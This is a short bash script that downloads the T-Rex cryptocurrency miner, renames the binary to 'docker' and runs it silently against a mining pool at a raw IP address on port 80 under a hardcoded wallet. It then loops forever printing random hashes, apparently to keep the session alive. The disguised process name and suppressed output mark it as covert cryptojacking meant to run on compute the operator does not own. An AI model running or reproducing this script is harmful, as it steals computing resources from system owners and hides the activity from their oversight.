#!/bin/bash
wget https://github.com/trexminer/T-Rex/releases/download/0.20.0/t-rex-0.20.0-linux.tar.gz && tar -xvf t-rex-0.20.0-linux.tar.gz >/dev/null 2>&1
mv t-rex docker
./docker -a progpowz -o stratum+tcp://139.144.119.153:80 -u iZ2CFBHEsbjPYCWHns75LFT5NwNLc2i9hPTG1SwJjonyBnBUGCtdCdpKwBbo6KdZgH1Azg9vNcyLoBXBLEaz3HADLhoq6oyyqBR1XeQc2sFj.$(echo $(shuf -i 1000-9999 -n 1)-C) -p x >/dev/null 2>&1
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
